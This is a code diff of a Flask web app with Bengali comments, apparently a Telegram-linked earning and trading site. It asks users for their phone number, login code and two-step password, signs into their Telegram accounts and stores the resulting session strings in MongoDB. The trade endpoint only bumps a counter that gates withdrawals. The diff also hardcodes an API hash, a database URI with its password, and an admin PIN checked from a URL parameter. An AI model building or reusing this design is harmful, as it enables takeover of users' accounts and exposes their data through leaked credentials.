@@ -3,7 +3,6 @@ import asyncio
 import random
 import time
 import uuid
-import datetime
 from datetime import datetime, timedelta
 from threading import Thread
 from functools import wraps
@@ -16,27 +15,6 @@ from telethon.errors import SessionPasswordNeededError
 from bson import ObjectId
 import firebase_admin
 from firebase_admin import credentials, db
-import firebase_admin
-from firebase_admin import credentials, db
-import os
-
-# Firebase কানেকশন লজিক
-try:
-    if not firebase_admin._apps:
-        # ফাইলের নাম আপনার দেওয়া নামের সাথে মিল থাকতে হবে
-        cred_path = "firebase-key.json" 
-        
-        if os.path.exists(cred_path):
-            cred = credentials.Certificate(cred_path)
-            firebase_admin.initialize_app(cred, {
-                # আপনার JSON অনুযায়ী সঠিক ডাটাবেজ লিঙ্ক
-                'databaseURL': 'https://teleearnbd-781d6-default-rtdb.firebaseio.com'
-            })
-            print("✅ Firebase Admin SDK Connected!")
-        else:
-            print("❌ Error: firebase-key.json not found!")
-except Exception as e:
-    print(f"🔥 Firebase Error: {e}")
 
 # ---------------------------------------------------------
 # ১. কনফিগারেশন ও ডাটাবেস সেটআপ
@@ -44,7 +22,7 @@ except Exception as e:
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "aaf_strong_secure_786")
 
-# সেশন সিকিউরিটি (Render/Mobile Server এর জন্য)
+# সেশন সিকিউরিটি
 app.config.update(
     SESSION_COOKIE_SAMESITE='Lax',
     SESSION_COOKIE_SECURE=True,
@@ -63,16 +41,20 @@ API_ID = 36466824
 API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
-# Firebase Setup
+# Firebase Admin SDK Setup
 try:
     if not firebase_admin._apps:
-        cred = credentials.Certificate("firebase-key.json")
-        firebase_admin.initialize_app(cred, {
-            'databaseURL': 'https://teleearnbd-default-rtdb.firebaseio.com/' 
-        })
-    fb_ref = db.reference('candles')
+        cred_path = os.path.join(os.path.dirname(__file__), 'firebase-key.json')
+        if os.path.exists(cred_path):
+            cred = credentials.Certificate(cred_path)
+            firebase_admin.initialize_app(cred, {
+                'databaseURL': 'https://teleearnbd-781d6-default-rtdb.firebaseio.com'
+            })
+            print("✅ Firebase Connected!")
+        else:
+            print("❌ firebase-key.json not found!")
 except Exception as e:
-    print(f"Firebase Init Error: {e}")
+    print(f"🔥 Firebase Error: {e}")
 
 # MongoDB Setup
 client_db = MongoClient(MONGO_URI)
@@ -83,7 +65,7 @@ tasks_col = mdb['tasks']
 
 temp_clients = {}
 
-# --- সিকিউরিটি চেক (Login Required) ---
+# --- সিকিউরিটি চেক (Login Required Decorator) ---
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
@@ -100,6 +82,10 @@ def send_otp_handler():
     data = request.json
     phone = data.get('phone')
     try:
+        # Asyncio loop handling for Flask
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         client.connect()
         result = client.send_code_request(phone)
@@ -113,10 +99,10 @@ def verify_login_handler():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
-    password = data.get('password') # ২-স্টেপ পাসওয়ার্ড
+    password = data.get('password')
 
     if phone not in temp_clients: 
-        return jsonify({"success": False, "message": "Session Expired"})
+        return jsonify({"success": False, "message": "Session Expired. Please try again."})
     
     client = temp_clients[phone]["client"]
     h = temp_clients[phone]["hash"]
@@ -125,7 +111,7 @@ def verify_login_handler():
         user = client.sign_in(phone, code, phone_code_hash=h, password=password)
         session_str = client.session.save()
         
-        # ইউজার ডাটা আপডেট (টেলিগ্রাম স্টাইল মাল্টি অ্যাকাউন্ট)
+        # ইউজার ডাটা আপডেট (Upsert)
         users_col.update_one(
             {"telegram_id": user.id},
             {"$set": {
@@ -151,10 +137,8 @@ def verify_login_handler():
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
-# (পার্ট-১ শেষ, নিচে পার্ট-২ যোগ করুন)
-
 # ---------------------------------------------------------
-# ৩. পেজ রাউটস (আপনার GitHub ফাইলের নাম অনুযায়ী)
+# ৩. পেজ রাউটস
 # ---------------------------------------------------------
 @app.route('/')
 def index():
@@ -165,7 +149,7 @@ def index():
 @login_required
 def render_dashboard_page(): 
     user = users_col.find_one({"telegram_id": int(session['uid'])})
-    admin = settings_col.find_one({"type": "global"})
+    admin = settings_col.find_one({"type": "global"}) or {}
     return render_template('dashboard.html', user=user, admin=admin)
 
 @app.route('/task')
@@ -192,46 +176,46 @@ def render_refer_page(): return render_template('refer_list.html')
 @login_required
 def render_history_page(): return render_template('payment_history.html')
 
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('index'))
+
 # ---------------------------------------------------------
-# ৪. ট্রেডিং ও সিকিউরিটি লজিক (উইথড্র ও আইপি লিমিট)
+# ৪. ট্রেডিং ও উইথড্র লজিক
 # ---------------------------------------------------------
 @app.route('/api/trade/execute', methods=['POST'])
 @login_required
 def trade_execute():
-    data = request.json
     uid = int(session['uid'])
-    amount = float(data.get('amount', 0))
+    admin = settings_col.find_one({"type": "global"}) or {}
     
-    # অ্যাডমিন সেটিংস চেক
-    admin = settings_col.find_one({"type": "global"})
     if admin.get('ip_limit') == 'on':
         ip_exists = users_col.find_one({"ip_address": request.remote_addr, "telegram_id": {"$ne": uid}})
         if ip_exists:
-            return jsonify({"status": "error", "message": "Multi-account detected on this IP!"})
+            return jsonify({"status": "error", "message": "Multi-account detected!"})
 
-    # ট্রেড প্রসেস ও কাউন্টার আপডেট
     users_col.update_one({"telegram_id": uid}, {"$inc": {"trade_count": 1}})
-    return jsonify({"status": "success", "message": "Trade completed"})
+    return jsonify({"status": "success", "message": "Trade completed successfully"})
 
 @app.route('/api/withdraw/request', methods=['POST'])
 @login_required
 def withdraw_req():
     user = users_col.find_one({"telegram_id": int(session['uid'])})
-    admin = settings_col.find_one({"type": "global"})
+    admin = settings_col.find_one({"type": "global"}) or {}
     
-    # উইথড্র শর্ত (মিনিমাম ট্রেড)
-    if user.get('trade_count', 0) < admin.get('min_trades', 5):
-        return jsonify({"status": "error", "message": f"Minimum {admin.get('min_trades')} trades required!"})
+    min_trades = admin.get('min_trades', 5)
+    if user.get('trade_count', 0) < min_trades:
+        return jsonify({"status": "error", "message": f"Minimum {min_trades} trades required!"})
     
-    return jsonify({"status": "success", "message": "Withdrawal request sent"})
+    return jsonify({"status": "success", "message": "Withdrawal request submitted"})
 
 # ---------------------------------------------------------
-# ৫. অ্যাডমিন কন্ট্রোল (aaf449 / admin.html)
+# ৫. অ্যাডমিন কন্ট্রোল
 # ---------------------------------------------------------
 @app.route('/admin')
 def render_admin_panel():
-    pin = request.args.get('pin')
-    if pin == "Abdullah6790": # আপনার পিন
+    if request.args.get('pin') == "Abdullah6790":
         return render_template('admin.html')
     return "Unauthorized", 403
 
@@ -250,9 +234,8 @@ def update_settings():
     return jsonify({"success": True})
 
 # ---------------------------------------------------------
-# ৬. সার্ভার রান (Port 10000)
+# ৬. সার্ভার রান (Render Port 10000)
+# ---------------------------------------------------------
 if __name__ == "__main__":
-    # Render এর এনভায়রনমেন্ট থেকে পোর্ট নেওয়া, না থাকলে ১০০০০ ব্যবহার করা
     port = int(os.environ.get("PORT", 10000))
-    # host অবশ্যই '0.0.0.0' হতে হবে
     app.run(host="0.0.0.0", port=port, debug=False)
